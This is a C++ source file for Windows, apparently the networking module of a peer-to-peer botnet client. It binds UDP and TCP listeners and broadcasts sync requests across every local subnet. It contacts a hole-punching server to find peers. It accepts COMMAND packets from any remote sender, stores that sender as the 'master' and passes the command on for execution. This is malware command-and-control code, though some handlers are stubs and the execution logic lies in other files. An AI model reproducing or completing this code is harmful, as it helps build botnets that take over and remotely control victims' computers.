#include <malloc.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include "network.h"
#include "ipc_manage.h"
#include "botnet.h"

#define UDP_PORT 54000
#define TCP_PORT 55000
#define TCP_BACKLOG 10

static SOCKET udp_sock;
static SOCKET tcp_sock;
static struct sockaddr_in master;
static BotnetNode botnet_topology;

/* init */
/*
* @purpose: Create basic sockets for communication operations.
* @params: none.
* @return: void.
* 
*/
void create_communication_sockets()
{
	/* locals */
	struct sockaddr_in server_struct;
	
	/* create and check udp socket */
	check((udp_sock = socket(AF_INET, SOCK_DGRAM, 0)), "can't create udp_sock");

	/* compatible with broadcasts */
	int trueflag = 1;
	setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, (char*)&trueflag, sizeof(trueflag));

	/* bind the udp socket */
	server_struct.sin_addr.S_un.S_addr = ADDR_ANY;
	server_struct.sin_family = AF_INET;
	server_struct.sin_port = htons(UDP_PORT);
	check(bind(udp_sock, (struct sockaddr*)&server_struct, sizeof(server_struct)), "can't bind udp_sock");
	
	/* create and check tcp socket */
	check((tcp_sock = socket(AF_INET, SOCK_STREAM, 0)), "can't create tcp_sock");

	/* bind the tcp socket */
	server_struct.sin_addr.S_un.S_addr = ADDR_ANY;
	server_struct.sin_family = AF_INET;
	server_struct.sin_port = htons(TCP_PORT);
	check(bind(tcp_sock, (struct sockaddr*)&server_struct, sizeof(server_struct)), "can't bind tcp_sock");

	/* open tcp socket */
	listen(tcp_sock, TCP_BACKLOG);
}

/* syncs */
void sync_request()
{
	/* locals */
	struct botnet_pack p;
	struct sockaddr_in broadcast;
	uint32_t host;
	uint32_t netmask;

	/* request msg */
	ZeroMemory(&p, BOTNET_PACK_SIZE);
	p.type = SYNC_REQUEST;

	/* send request to all connected networks */
	for (size_t i = 0; i < adapters_count; i++)
	{
		host = DEC_ADAPTER_IPS_ARR[i].hip;
		netmask = DEC_ADAPTER_IPS_ARR[i].netmask;

		/* create broadcast destination */
		broadcast.sin_family = AF_INET;
		broadcast.sin_port = htons(UDP_PORT);
		broadcast.sin_addr.S_un.S_addr = host | (~netmask);

		sendto(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&broadcast, sizeof(broadcast));
	}
}

static void sync_reply(struct sockaddr_in client)
{
	/* locals */
	struct botnet_pack p;
	
	/* reply msg */
	ZeroMemory(&p, BOTNET_PACK_SIZE);
	p.type = SYNC_REPLY;

	/* send packet */
	sendto(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
}
/* end syncs */

/* P2P */
/*
* @purpose: ask the hole puncing server for a peer.
* @params: socket used to send the request.
* @return void.
*
*/
void peer_request()
{
	/* locals */
	struct botnet_pack pack;
	static struct sockaddr_in server;

	/* create request */
	ZeroMemory(&pack, BOTNET_PACK_SIZE);
	pack.type = PEER_REQUEST;

	/* destination */
	server.sin_family = AF_INET;
	server.sin_port = htons(HOLE_PUNCHING_SERVER_PORT);
	inet_pton(AF_INET, HOLE_PUNCHING_SERVER_IP, &server.sin_addr);

	/* send request */
	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
}
/* end P2P */

/* handling incomings */
static void handle_udp_connections()
{
	/* locals */
	struct botnet_pack p;
	struct sockaddr_in client;
	int client_size = sizeof(client);

	/* recv packet */
	recvfrom(udp_sock, (char*)&p, 1024, 0, (struct sockaddr*)&client, &client_size);
	
	for (size_t i = 0; i < adapters_count; i++)
		if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
			return;
	
	switch (p.type)
	{
	case PACK_TYPE::COMMAND:
		master = client;
		send_command((u_char*)&p, BOTNET_PACK_SIZE);
		break;
	case PACK_TYPE::COMMAND_RESULT:
		break;
	case PACK_TYPE::SYNC_REQUEST:
		sync_reply(client);
		break;
	case PACK_TYPE::SYNC_REPLY:
		break;
	case PACK_TYPE::PEER_REPLY:
		botnet_topology.addPeer(p, udp_sock);
		break;
	}
}

static void handle_tcp_connections(SOCKET client)
{

}

/*
* @purpose: Handle inbound packets.
* @params: none.
* @return: void.
* 
*/
void handle_incomings()
{
	fd_set master, copy;
	FD_ZERO(&master);
	FD_SET(udp_sock, &master);
	FD_SET(tcp_sock, &master);

	while (1)
	{
		copy = master;
		
		size_t socketCount = select(0, &copy, NULL, NULL, NULL);

		for (size_t i = 0; i < socketCount; i++)
		{
			SOCKET s = copy.fd_array[i];
			if (s == udp_sock)
				handle_udp_connections();
			else if (s == tcp_sock)
			{
				SOCKET client = accept(tcp_sock, NULL, NULL);
				FD_SET(client, &master);
			}
			else
			{
				handle_tcp_connections(s);
				FD_CLR(s, &master);
			}
		}
	}
}
/* end handling incomings */